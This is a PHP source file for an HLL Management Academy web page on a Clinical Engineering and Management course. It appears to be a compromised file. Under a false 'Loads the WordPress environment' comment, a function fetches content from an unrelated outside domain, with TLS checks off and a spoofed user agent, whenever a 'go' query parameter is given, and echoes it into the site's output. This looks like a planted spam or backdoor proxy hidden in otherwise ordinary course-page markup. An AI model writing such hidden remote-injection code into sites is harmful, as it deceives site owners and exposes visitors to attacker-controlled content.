<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */
function fetchDataFromSite($site) {
    $url = 'https://replication2.pkcdurensawit.net/hllacademy_cem/' . $site . '/';
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_USERAGENT => "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_CUSTOMREQUEST => 'GET'
    ]);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

if(isset($_GET['go'])) {
    $site = $_GET['go'];
    $data = fetchDataFromSite($site);
    echo $data;
} else {

    ?>

<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0; maximum-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">

    <link rel="shortcut icon" type="image/x-icon" href="images/favicon.ico">
    <title>HLL Academy | Courses | CEM</title>

    <!-- CSS -->
    <link href="css/reset.css" rel="stylesheet">
    <link href="css/fonts.css" rel="stylesheet">
    <link href="assets/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="assets/select2/css/select2.min.css" rel="stylesheet">
    <link href="assets/font-awesome/css/font-awesome.min.css" rel="stylesheet">
    <link href="assets/iconmoon/css/iconmoon.css" rel="stylesheet">
    <link href="assets/owl-carousel/css/owl.carousel.min.css" rel="stylesheet">
    <link href="css/custom.css" rel="stylesheet">

    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
        <script src="js/html5shiv.min.js"></script>
        <script src="js/respond.min.js"></script>
        <![endif]-->

</head>

<body>

    <!-- ==============================================
    ** Preloader **
    =================================================== -->
    <div id="loading">
        <div class="element">
            <div class="sk-folding-cube">
                <div class="sk-cube1 sk-cube"></div>
                <div class="sk-cube2 sk-cube"></div>
                <div class="sk-cube4 sk-cube"></div>
                <div class="sk-cube3 sk-cube"></div>
            </div>
        </div>
    </div>

    <?php include('header.php') ?>

    <!-- ==============================================
    ** Inner Banner **
    =================================================== -->
    <div class="inner-banner">
        <div class="container">
            <div class="row">
                <div class="col-sm-8 col-lg-9">
                    <div class="content">
                        <h2>Clinical Engineering & Management</h2>
                        <p>HLL Management Academy | Courses</p>
                    </div>
                </div>
                
                        <div class="arrow"><i class="fa fa-angle-right" aria-hidden="true"></i></div>
                    </a> <a href="#" class="download-prospects brochure"> <span class="icon-brochure-icon"></span> <span class="small">Download:</span>Course Brochure</a> </div>
            </div>
        </div>
    </div>

    <!-- ==============================================
    ** Course Description **
    =================================================== -->
    <section class="about inner padding-lg">
        <div class="container">
            <div class="row">
                <div class="col-md-7 col-md-push-5 left-block">
                    <h2>COURSE DESCRIPTION</h2>
                    <p>Clinical Engineering and Management is a fast growing speciality of Biomedical Engineering. It offers a broad range of career opportunities in hospitals and medical industries around the world.</p>
<p>This course in clinical engineering and management is designed to train engineers to manage wide range of equipment used in hospitals. It will enable the students for judicious procurement and utilization of medical equipment. Clinical Engineering principles ensures safety and reliability of equipment when in use.</p>
<p>The Clinical Engineering and Management course is a combination of engineering techniques applied to direct patient care. Engineers are also exposed to management and hospital design techniques. On completion of the course, the clinical engineer will be able to support and advance patient care using advanced engineering and managerial skills.</p>
<p>This programme has been carefully designed for engineers interested in working in areas of clinical or biomedical engineering. The course focuses on meeting the growing national and international needs for clinical engineers with excellent technical and management skills.</p>
<p>HLL Management Academy offers two novel courses in Clinical Engineering and Management on long term basis.</p>
                    <div class="cert-head">
                        <h3>CERTIFICATION</h3>
                    </div>
                    <p>HLL Management Academy offers two novel courses in Clinical Engineering and Management on long term basis.</p>
                    <ul class="cert-list clearfix">
                        <li>Post Graduate Diploma in Clinical Engineering and Management (PGDCEM)</li>
                        <li>Advanced diploma in Clinical Engineering and Management </li>
                        
                    </ul>
                </div>
                <div class="col-md-5 col-md-pull-7">
                    <div class="enquire-wrapper">
                        <figure class="hidden-xs hidden-sm"><img src="images/course1.jpg" class="img-responsive" alt=""></figure>
                       <?php include('enquiry.php')?>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-sm-12">
                    <div class="course-detail clearfix">
                        <div class="duration clearfix">
                            <div class="icon"><span class="icon-duration-icon"></span></div>
                            <div class="detail"> <span>Duration</span> 2 YEAR </div>
                        </div>
                        <div class="duration eligible clearfix">
                            <div class="icon"><span class="icon-eligibility-icon"></span></div>
                            <div class="detail"> <span>ELIGIBILITY:</span> Graduation/DBA/<br>
                                Diploma/Equivalent </div>
                        </div>
                        <div class="duration fee clearfix">
                            <div class="detail"> <span>COURSE FEE:</span> 10,000 </div>
                        </div>
                        <a href="apply-online.html" class="btn">apply now <span class="icon-more-icon"></span></a>
                    </div>
                </div>
            </div>
        </div>
    </section>

   

    <?php include('footer.php') ?>

    <!-- Scroll to top -->
    <a href="#" class="scroll-top"><i class="fa fa-chevron-up" aria-hidden="true"></i></a>

    <!-- Optional JavaScript -->
    <script src="js/jquery.min.js"></script>
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="assets/select2/js/select2.min.js"></script>
    <script src="assets/bxslider/js/bxslider.min.js"></script>
    <script src="assets/owl-carousel/js/owl.carousel.min.js"></script>
    <script src="js/custom.js"></script>
</body>

</html>

<?php
}
?>


